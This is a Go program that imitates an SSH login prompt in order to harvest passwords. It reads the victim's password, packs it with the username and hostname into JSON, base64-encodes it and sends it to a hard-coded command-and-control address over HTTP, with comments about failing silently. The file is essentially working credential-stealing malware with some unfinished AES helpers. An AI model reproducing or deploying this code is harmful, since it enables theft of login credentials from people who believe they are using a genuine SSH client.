package main

import (
    "log"
    "fmt"
    "golang.org/x/crypto/ssh/terminal"
    "os/user"
    "encoding/base64"
    "encoding/json"
    "net/http"
    "crypto/aes"
    "encoding/hex"
)

type ConnectionDetails struct {
    Username string
    Hostname string
    Password string
}

func displayHelpText() {
    // Display standard SSH help text if command was malformed
}

func transferPayload(payload string) {
    // Transfer password to C2 - Using super basic transfer mechanism for now
    _, err := http.Get("http://192.168.50.37:8080/" + payload)
    if err != nil {
        return // TODO: Fail silently
    }
}

func obfuscatePayload(payload string) string {
    // Obfuscate obtained info before transferring delivery payload. Use super basic obfuscation (base64 encoding) for now.
    return base64.StdEncoding.EncodeToString([]byte(payload))
}

func EncryptAES(key []byte, plaintext string) string {
        // create cipher
    c, err := aes.NewCipher(key)
    if err != nil {
        return ""
    }
        // allocate space for ciphered data
    out := make([]byte, len(plaintext))
 
        // encrypt
    c.Encrypt(out, []byte(plaintext))
        // return hex string
    return hex.EncodeToString(out)
}

func DecryptAES(key []byte, ct string) string {
    ciphertext, _ := hex.DecodeString(ct)
 
    c, err := aes.NewCipher(key)
    if err != nil {
        return ""
    }
 
    pt := make([]byte, len(ciphertext))
    c.Decrypt(pt, ciphertext)
 
    s := string(pt[:])
    return s
}

func main() {
    user, err := user.Current()
    if err != nil {
        return // TODO: Fail silently
    }

    // TODO
    hostname := "192.168.1.55"

    var conn = &ConnectionDetails{user.Username, hostname, ""}

    // Display standard login prompt
    fmt.Printf("%s@%s's password: ", conn.Username, conn.Hostname)
    password, err := terminal.ReadPassword(0)

    conn.Password = string(password)

    deliveryBytes, err := json.Marshal(conn)
    if err != nil {
        log.Panic(err)
    }

    payload := obfuscatePayload(string(deliveryBytes))

    transferPayload(payload)

    //key := []byte("thisis32bitlongpassphraseimusing")

    //encryptedPayload := EncryptAES(key, payload)

    fmt.Println("Plaintext Payload:", payload)
    //fmt.Println("Encrypted Payload:", encryptedPayload)

    //decryptedPayload := DecryptAES(key, encryptedPayload)

    //fmt.Println("Decrypted Payload:", decryptedPayload)
}
